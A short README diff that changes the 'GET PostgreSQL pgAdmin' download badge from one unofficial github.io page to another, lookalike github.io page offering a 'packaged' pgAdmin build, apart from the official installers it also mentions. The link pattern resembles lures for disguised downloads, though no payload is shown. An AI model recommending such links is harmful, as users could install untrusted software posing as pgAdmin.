@@ -178,7 +178,7 @@ pgweb has a public demo if you want to click a grid before you install. PostgreS
 
 ## Download
 
-[![GET PostgreSQL pgAdmin](https://img.shields.io/badge/GET-PostgreSQL%20pgAdmin-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/PostgreSQL-pgAdmin)
+[![GET PostgreSQL pgAdmin](https://img.shields.io/badge/GET-PostgreSQL%20pgAdmin-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://postgresql-pgadmin.github.io/pgAdmin-4/)
 
 Use the GET badge for the packaged PostgreSQL pgAdmin build. Official installers also exist for Windows, macOS, and Linux. pgweb ships as a single binary per OS if you only need the light explorer.
 
